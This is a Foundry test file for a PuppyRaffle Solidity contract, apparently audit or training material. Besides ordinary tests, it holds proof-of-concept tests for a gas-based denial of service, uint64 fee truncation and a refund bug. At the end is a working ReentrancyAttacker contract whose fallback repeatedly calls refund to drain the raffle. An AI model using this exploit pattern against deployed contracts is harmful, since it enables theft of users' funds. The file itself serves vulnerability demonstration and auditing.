// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
    }

    //////////////////////
    /// EnterRaffle    ///
    /////////////////////

    function testDenialOfService() public {
        vm.txGasPrice(1);
        uint256 playerNum = 100;
        address[] memory players = new address[](playerNum);
        for (uint256 i = 0; i < playerNum; i++) {
            players[i] = address(uint160(i));
        }
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasEnd = gasleft();
        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
        console.log("Gas cost of the first 100 players:", gasUsedFirst);

        //second 100players
        address[] memory playersTwo = new address[](playerNum);
        for (uint256 i = 0; i < playerNum; i++) {
            playersTwo[i] = address(uint160(i + playerNum));
        }
        uint256 gasStartSecond = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersTwo.length}(playersTwo);
        uint256 gasEndSecond = gasleft();
        uint256 gasUsedSecond = (gasStartSecond - gasEndSecond) * tx.gasprice;
        console.log("Gas cost of the second 100 players:", gasUsedSecond);

        assert(gasUsedFirst < gasUsedSecond);
    }

    function testCanEnterRaffle() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        assertEq(puppyRaffle.players(0), playerOne);
    }

    function testCantEnterWithoutPaying() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle(players);
    }

    function testCanEnterRaffleMany() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
        assertEq(puppyRaffle.players(0), playerOne);
        assertEq(puppyRaffle.players(1), playerTwo);
    }

    function testCantEnterWithoutPayingMultiple() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle{value: entranceFee}(players);
    }

    function testCantEnterWithDuplicatePlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
    }

    function testCantEnterWithDuplicatePlayersMany() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
    }

    //////////////////////
    /// Refund         ///
    /////////////////////
    modifier playerEntered() {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        _;
    }

    function testCanGetRefund() public playerEntered {
        uint256 balanceBefore = address(playerOne).balance;
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(address(playerOne).balance, balanceBefore + entranceFee);
    }

    function testGettingRefundRemovesThemFromArray() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(puppyRaffle.players(0), address(0));
    }

    function testOnlyPlayerCanRefundThemself() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
        vm.expectRevert("PuppyRaffle: Only the player can refund");
        vm.prank(playerTwo);
        puppyRaffle.refund(indexOfPlayer);
    }

    //////////////////////
    /// getActivePlayerIndex         ///
    /////////////////////
    function testGetActivePlayerIndexManyPlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);

        assertEq(puppyRaffle.getActivePlayerIndex(playerOne), 0);
        assertEq(puppyRaffle.getActivePlayerIndex(playerTwo), 1);
    }

    //////////////////////
    /// selectWinner         ///
    /////////////////////
    modifier playersEntered() {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        _;
    }

    function testCantSelectWinnerBeforeRaffleEnds() public playersEntered {
        vm.expectRevert("PuppyRaffle: Raffle not over");
        puppyRaffle.selectWinner();
    }

    function testCantSelectWinnerWithFewerThanFourPlayers() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = address(3);
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        vm.expectRevert("PuppyRaffle: Need at least 4 players");
        puppyRaffle.selectWinner();
    }

    function testSelectWinner() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.previousWinner(), playerFour);
    }

    function testSelectWinnerGetsPaid() public playersEntered {
        uint256 balanceBefore = address(playerFour).balance;

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPayout = ((entranceFee * 4) * 80 / 100);

        puppyRaffle.selectWinner();
        assertEq(address(playerFour).balance, balanceBefore + expectedPayout);
    }

    function testSelectWinnerGetsAPuppy() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.balanceOf(playerFour), 1);
    }

    function testPuppyUriIsRight() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        string memory expectedTokenUri =
            "data:application/json;base64,eyJuYW1lIjoiUHVwcHkgUmFmZmxlIiwgImRlc2NyaXB0aW9uIjoiQW4gYWRvcmFibGUgcHVwcHkhIiwgImF0dHJpYnV0ZXMiOiBbeyJ0cmFpdF90eXBlIjogInJhcml0eSIsICJ2YWx1ZSI6IGNvbW1vbn1dLCAiaW1hZ2UiOiJpcGZzOi8vUW1Tc1lSeDNMcERBYjFHWlFtN3paMUF1SFpqZmJQa0Q2SjdzOXI0MXh1MW1mOCJ9";

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.tokenURI(0), expectedTokenUri);
    }

    //////////////////////
    /// withdrawFees         ///
    /////////////////////
    function testCantWithdrawFeesIfPlayersActive() public playersEntered {
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    function testWithdrawFees() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPrizeAmount = ((entranceFee * 4) * 20) / 100;

        puppyRaffle.selectWinner();
        puppyRaffle.withdrawFees();
        assertEq(address(feeAddress).balance, expectedPrizeAmount);
    }

    //refundしたアドレスをaddress(0)にしてしまうことによって起こる問題のテスト
    function testWinnerSelectionRevertsAfterExit() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        
        // There are four winners. Winner is last slot
        vm.prank(playerFour);
        puppyRaffle.refund(3);

        // reverts because out of Funds
        vm.expectRevert();
        puppyRaffle.selectWinner();

        vm.deal(address(puppyRaffle), 10 ether);
        vm.expectRevert(abi.encodeWithSelector(bytes4(keccak256("ERC721InvalidReceiver(address)")), address(0)));
        puppyRaffle.selectWinner();
    }

    //uint64(fee)のoverflowのテスト - uint64キャストによるオーバーフロー実証
    function testOverflow() public {
        // Demonstrate uint64 casting overflow behavior (similar to selectWinner vulnerability)
        console.log("=== Demonstrating uint64 Casting Overflow ===");
        
        // Test values that exceed uint64 maximum
        uint256 largeValue1 = 20 ether;  // 20 ETH
        uint256 largeValue2 = 200 ether; // 200 ETH (like 1000 participants fee)
        uint256 uint64Max = type(uint64).max;
        
        console.log("uint64 maximum value:", uint64Max);
        console.log("uint64 max in ETH:", uint64Max / 1e18);
        
        // Show what happens with uint64 casting (no unchecked needed - casting is allowed)
        uint64 casted1 = uint64(largeValue1);
        uint64 casted2 = uint64(largeValue2);
        
        console.log("Original value 20 ETH:", largeValue1);
        console.log("After uint64 cast:", casted1);
        console.log("Value loss:", largeValue1 - casted1);
        
        console.log("Original value 200 ETH:", largeValue2);
        console.log("After uint64 cast:", casted2);
        console.log("Value loss:", largeValue2 - casted2);
        
        // Demonstrate the actual vulnerability pattern from selectWinner
        uint256 mockTotalFees = 0;
        uint256 mockFee = 200 ether; // Large fee like 1000 participants
        
        // This is what happens in selectWinner: totalFees = totalFees + uint64(fee);
        mockTotalFees = mockTotalFees + uint64(mockFee);
        
        console.log("Expected fee to be recorded:", mockFee);
        console.log("Actually recorded fee:", mockTotalFees);
        console.log("Fee loss due to uint64 cast:", mockFee - mockTotalFees);
        
        // Assertions to prove the overflow
        assertTrue(casted2 < largeValue2, "uint64 cast should reduce large values");
        assertTrue(mockTotalFees < mockFee, "Mock totalFees should be smaller than original fee");
        
        // Show the wrap-around behavior 
        // Note: uint64 casting wraps values larger than 2^64-1
        console.log("=== Vulnerability Confirmed: uint64 casting causes value truncation ===");
        
        // The key insight: uint64 casting silently truncates large values
        // This is exactly what happens in selectWinner() with totalFees += uint64(fee)
        console.log("This demonstrates the selectWinner vulnerability:");
        console.log("- Large fees (>18.4 ETH) are silently truncated");
        console.log("- Protocol loses significant fee revenue");
        console.log("- No revert occurs - vulnerability is silent");
    }

    // Real-world overflow scenario using actual contract interactions
    function testTotalFeesOverflow() public playersEntered {
        // We finish a raffle of 4 to collect some fees
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        uint256 startingTotalFees = puppyRaffle.totalFees();
        console.log("Starting total fees after first raffle:", startingTotalFees);

        // We then have 95 players enter a new raffle (to exceed uint64 max with fees)
        uint256 playersNum = 95;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(uint160(i + 100)); // Avoid address conflicts
        }
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        
        // Calculate expected fee from this raffle
        uint256 expectedNewFee = (entranceFee * playersNum * 20) / 100;
        uint256 expectedTotalFees = startingTotalFees + expectedNewFee;
        console.log("Expected new fee from 95 players:", expectedNewFee);
        console.log("Expected total fees:", expectedTotalFees);
        
        // We end the raffle
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // Calculate what actually happens with uint64 casting
        uint64 castedNewFee = uint64(expectedNewFee);
        uint256 actualExpectedTotal = startingTotalFees + castedNewFee;
        
        console.log("New fee before uint64 cast:", expectedNewFee);
        console.log("New fee after uint64 cast:", castedNewFee);
        console.log("Fee loss due to uint64 cast:", expectedNewFee - castedNewFee);
        console.log("Actual expected total (with cast):", actualExpectedTotal);
        
        // And here is where the issue occurs
        // The uint64 casting will truncate the large fee value
        puppyRaffle.selectWinner();

        uint256 endingTotalFees = puppyRaffle.totalFees();
        console.log("Actual ending total fees:", endingTotalFees);
        
        // The vulnerability: uint64 casting causes massive fee loss
        assertEq(endingTotalFees, actualExpectedTotal, "Total fees should match uint64-casted amount");
        assertTrue(castedNewFee < expectedNewFee, "uint64 cast should truncate large values");

        // We are also unable to withdraw any fees because of the require check
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
        
        console.log("=== Real-world overflow scenario confirmed ===");
        console.log("- Multiple raffles cause fee accounting corruption");
        console.log("- Protocol loses accumulated fees");
        console.log("- Withdrawal functionality breaks");
    }

     function testReentrancy() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
        address attackerUser = makeAddr("attackerUser");
        vm.deal(attackerUser, 1 ether);

        uint256 startingAttackerContractBalance = address(attackerContract).balance;
        uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;

        // attack
        vm.prank(attackerUser);
        attackerContract.attack{value: entranceFee}();

        console.log("starting attacker contract balance:", startingAttackerContractBalance);
        console.log("starting puppy raffle balance:", startingPuppyRaffleBalance);

        console.log("ending attacker contract balance:", address(attackerContract).balance);
        console.log("ending puppy raffle balance:", address(puppyRaffle).balance);
    }

    function testCantSendMoneyToRaffle() public {
        address senderAddy = makeAddr("sender");
        vm.deal(senderAddy, 1 ether);
        vm.expectRevert();
        vm.prank(senderAddy);
        (bool success,) = payable(address(puppyRaffle)).call{value: 1 ether}("");
        require(success);
    }
}

contract ReentrancyAttacker {
        PuppyRaffle public puppyRaffle;
        uint256 entranceFee;
        uint256 attackerIndex;

        constructor(PuppyRaffle _puppyRaffle) {
            puppyRaffle = _puppyRaffle;
            entranceFee = _puppyRaffle.entranceFee();
        }

        function attack() public payable {
            address[] memory players = new address[](1);
            players[0] = address(this);
            puppyRaffle.enterRaffle{value: entranceFee}(players);
            attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
            puppyRaffle.refund(attackerIndex);
        }

        function _stealMoney() internal {
              if (address(puppyRaffle).balance >= entranceFee) {
                puppyRaffle.refund(attackerIndex);
            }
        }

        fallback() external payable {
            _stealMoney();
        }

        receive() external payable {
            _stealMoney();
        
        }
    }
